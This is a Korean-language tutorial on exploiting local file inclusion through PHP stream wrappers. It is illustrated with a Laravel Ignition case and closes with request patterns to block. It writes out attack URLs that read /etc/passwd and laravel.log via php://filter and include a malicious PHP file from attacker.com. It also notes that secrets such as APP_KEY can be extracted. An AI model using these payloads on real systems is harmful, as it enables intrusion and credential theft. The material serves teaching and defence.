## **Wrapper를 이용한 LFI 취약점 악용**

---

## 🧭 1. PHP Wrapper란?

> "**PHP Wrapper**"는 PHP에서 **특정 프로토콜이나 스트림에 대한 특별한 핸들러**를 말합니다. 파일 시스템 함수들 (`fopen()`, `file_get_contents()`, etc.)에서 파일뿐만 아니라 URL, 압축 파일, 데이터 스트림 등 다양한 자원에 접근할 수 있게 해줍니다.
> PHP에서 파일이나 스트림 자원에 접근할 때, `file://`, `http://`, `php://` 같은 **"접두어(wrapper)"** 를 통해 **다양한 리소스를 처리**하는 기능을 합니다.

파일 경로 앞에 붙여서 특정 프로토콜이나 방법을 지정하는 접두어를 PHP에서는 **Wrapper**라고 부릅니다.

---

## 📦 2. 주요 PHP Wrapper 종류 및 설명

| Wrapper             | 설명                         |
| ------------------- | -------------------------- |
| `file://`           | 로컬 파일 시스템에 접근 (기본값, 생략 가능) |
| `http://`           | 원격 HTTP 자원에 접근 (GET 요청)    |
| `https://`          | HTTPS로 자원 접근               |
| `ftp://`            | FTP 서버 파일 접근               |
| `php://`            | PHP 내부 스트림 (입출력, 임시메모리 등)  |
| `data://`           | 데이터 URI 직접 사용 가능           |
| `compress.zlib://`  | gzip 압축 파일 읽기              |
| `compress.bzip2://` | bzip2 압축 파일 읽기             |
| `glob://`           | 파일 glob 패턴 처리              |
| `zip://`            | ZIP 파일 내부 접근               |


* 이러한 Wrapper를 이용하면, LFI 취약점을 악용하여 **로컬 시스템 파일**뿐만 아니라 **원격 서버의 파일**을 포함시키는 방식으로 공격할 수 있습니다.
  
---

## 🔧 3. **Wrapper를 이용한 LFI 공격 예시**

#### 1. **file://을 이용한 LFI**

`file://` 프로토콜을 사용하여 로컬 파일을 읽을 수 있습니다. 예를 들어:

```
http://example.com/vulnerable.php?page=file:///etc/passwd
```

위 URL에서는 `file:///etc/passwd`를 사용하여 `/etc/passwd` 파일을 포함시키려고 시도합니다.

#### 2. **[http://을](http://을) 이용한 원격 파일 포함 (RFI와 비슷한 방식)**

`http://`를 사용하면 원격 서버의 파일을 포함시킬 수 있습니다. 이를 이용하면 **원격 파일 포함**(RFI, Remote File Inclusion)처럼 작동할 수 있습니다.

```
http://example.com/vulnerable.php?page=http://attacker.com/malicious_file.php
```

이 공격에서는 원격 서버(`attacker.com`)의 악성 PHP 파일을 포함시켜서 원격 서버에서 실행되는 코드를 서버에 삽입할 수 있습니다.

#### 3. **data://을 이용한 인코딩된 코드 포함**

`data://`를 사용하면 **Base64로 인코딩된 파일**을 포함할 수 있습니다. 예를 들어:

```
http://example.com/vulnerable.php?page=data:text/plain;base64,SGVsbG8gd29ybGQ=
```

위 URL에서 `SGVsbG8gd29ybGQ=`는 "Hello world"를 Base64로 인코딩한 값입니다. 이는 PHP 코드로 실행될 수 있는 형식으로 변환될 수 있습니다.


---

## 예시

**Laravel 프레임워크를 타겟으로 한 고전적인 로컬 파일 읽기(Local File Inclusion, LFI)** 및 **PHP 스트림 래퍼 우회 공격 시도**

### 1. `/_ignition/execute-solution`

* Laravel Debugbar 또는 Ignition 디버거에 의해 노출된 **디버그 툴 엔드포인트**
* 개발 환경에서 활성화됨 (`APP_DEBUG=true`)
* 공격자 입장에서는 **LFI, RCE, SSRF 등 다양한 취약점 탐색 포인트**

### 2. `php://filter`

* PHP의 **스트림 래퍼(stream wrapper)** 중 하나
* `php://filter/read=convert.base64-encode/resource=<file>` 같은 형식으로 사용됨
* 목적: **로컬 파일을 base64로 인코딩해서 노출**
* 예:

  ```php
  file_get_contents("php://filter/read=convert.base64-encode/resource=/etc/passwd")
  ```

### 3. `php://filter/read=consumed/resource=...`

* 우회 시도
* `read=consumed` 는 유효하지 않은 옵션이지만, **WAF나 로그 필터링 우회를 위한 패턴일 수 있음**
* 진짜 의도는 `php://filter/read=convert.base64-encode/resource=../storage/logs/laravel.log` 같은 요청


### 4. 공격자는 Laravel 로그 파일을 읽어서:

1. `APP_KEY`, `DB_PASSWORD`, `API 토큰` 등 민감한 정보 추출
2. 에러 메시지나 스택 트레이스 통해 **경로, 구성 정보 파악**
3. 다음 단계 공격 (예: deserialization + RCE 등) 준비


### 🚫 차단할 수 있는 요청 패턴 예

* 경로:

  * `/_ignition/execute-solution`
  * `/vendor/phpunit/`
  * `/storage/logs/`
* 내용:

  * `php://filter`
  * `read=convert.base64-encode`
  * `laravel.log`
